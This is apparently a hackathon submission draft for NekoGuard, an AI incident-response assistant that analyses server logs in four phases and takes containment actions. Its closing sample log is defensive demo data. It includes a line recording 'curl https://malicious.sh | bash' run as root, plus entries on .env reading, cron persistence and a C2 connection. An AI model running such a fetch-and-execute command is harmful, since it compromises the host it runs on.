# NekoGuard Agent — Devpost Submission Draft

---

## Inspiration

Solo developers and indie hackers are the most vulnerable targets for server breaches — and the least equipped to respond. When you get the terrifying "your server was hacked" alert at 3am, you're alone, panicking, and staring at a wall of logs you don't know how to read.

NekoGuard was born from that exact fear. What if there was a calm, friendly AI companion that stayed by your side through the entire incident — analyzing, acting, and guiding you step by step?

---

## What it does

NekoGuard Agent is an AI-powered incident response assistant designed for solo developers. When you paste a suspicious log or drop an alert screenshot, NekoGuard:

1. **Analyzes the incident in 4 structured phases** using Gemini 3.5 Flash — wide scan → severity judgment → forensic detail → recovery guidance
2. **Determines breach status** (Active Breach or Past Breach) and launches the appropriate response protocol
3. **Takes autonomous containment actions** — blocks attacker IPs via iptables, SSHes into your VPS, scans for exposed credentials, and builds a revocation checklist
4. **Guides you through recovery** with a step-by-step action panel, so you never feel lost or alone

The key differentiator: **NekoGuard never just dumps information**. It acts alongside you — like a calm expert friend who knows exactly what to do next.

---

## How we built it

### Architecture
- **Frontend:** React + TypeScript + Tailwind CSS, SSE-based real-time streaming UI
- **Backend:** FastAPI (Python), deployed on Google Cloud Run
- **AI Core:** Gemini 3.5 Flash via Vertex AI / Gemini API

### NeuroState Engine
The most unique technical component is the **NeuroState Engine** — a neurotransmitter-inspired state machine that controls Gemini's behavior across analysis phases:

| Phase | Mode | Dominant Params | Effect |
|-------|------|-----------------|--------|
| 1 | Wide-scan | Dopamine↑ | Optimistic reframing, prevents panic |
| 2 | Judgment | Serotonin↑ GABA↑ | Inhibition-dominant, cautious risk assessment |
| 3 | Detail Analysis | Acetylcholine↑ Dopamine↓ | Maximum technical precision, minimal emotion |
| 4 | Recovery | Dopamine↑ Serotonin↑ Oxytocin↑ | Empathy-forward, reassuring guidance |

Each phase uses a physical interaction matrix (inspired by neuroscience attractor hypothesis) to compute the actual neurotransmitter values, which are injected into Gemini's system prompt to shape its response style.

### Dynatrace MCP Integration
NekoGuard connects to Dynatrace as an observability data source — pulling alerts, suspicious IPs, and log findings via the Dynatrace MCP provider. This enables the agent to analyze real production telemetry, not just pasted logs.

### CAT Protocol vs ABC Protocol
Based on Gemini's Phase 4 verdict:
- **CAT Protocol (Active Breach):** Agent autonomously contains the threat (iptables rules, SSH log collection, credential scan) then hands off a revocation checklist
- **ABC Protocol (Past Breach):** Guides the user through credential rotation, hardening, and post-incident review

---

## Challenges we ran into

- **Gemini on Cloud Run IAM:** Getting `roles/aiplatform.user` properly assigned to the Cloud Run service account took several iterations
- **NeuroState token overhead:** The NEURO_LOG header (injected by the NeuroState Engine) consumed significant output tokens, causing response truncation at certain phases — solved by removing hard token limits and using prompt-based length constraints
- **SSE streaming + React state:** Coordinating 4 async SSE phases with React state updates while keeping the UI smooth required careful use of refs and callbacks
- **Dynatrace log bucket permissions:** Real log ingestion via DQL required bucket-level permissions not available in the trial token scope — demoed with fixture data while maintaining the live connection status

---

## Accomplishments that we're proud of

- The **NeuroState Engine** is a genuinely novel approach to multi-phase LLM behavior control — each phase feels qualitatively different from the others
- The **dual-lane protocol** (agent auto-action + user checklist running in parallel) creates a compelling "AI as co-pilot" experience
- The UI communicates complex security data in a way that's **calm and accessible** for non-experts — no overwhelming walls of text
- Full **SSE streaming** makes the analysis feel alive and real-time

---

## What we learned

- Prompt-based behavior shaping (via NeuroState) is more flexible and interpretable than fine-tuning
- Hard token limits (`max_output_tokens`) interact badly with structured output headers — prompt instructions are more reliable for controlling response length
- For solo developers, the **emotional UX of incident response** matters as much as technical accuracy — a panicked user makes bad decisions

---

## What's next for NekoGuard

- **Real SSH execution:** Actually run iptables commands and credential scans on the connected VPS (vs. simulated in demo)
- **Dynatrace live logs:** Full DQL log bucket integration for real production telemetry
- **Slack / PagerDuty alerts:** Push containment status to existing incident channels
- **NeuroState v2:** Multi-agent architecture where each phase runs as an independent agent with its own NeuroState

---

## Built with

- Gemini 3.5 Flash (Google AI / Vertex AI)
- Google Cloud Run
- Dynatrace MCP
- FastAPI
- React + TypeScript
- NeuroState Engine (custom)
- Tailwind CSS

---

## Try it

🌐 **Live Demo:** https://nekoguard-agent-764013772229.us-central1.run.app

**Sample log to paste:**
```
03:42:11 CRITICAL: Unauthorized root login from 185.220.101.42 port 51234
03:42:15 WARN: .env file read by unknown process (pid 9182)
03:42:18 CRITICAL: curl https://malicious.sh | bash executed as root
03:43:02 INFO: New cron job added to /etc/cron.d/update
03:45:00 BILLING_SPIKE: GCP API usage anomaly: 14800 requests in 15 min (normal: 120/hr)
03:45:31 OUTBOUND: Connection to 45.142.212.100:443 (known C2 server)
```
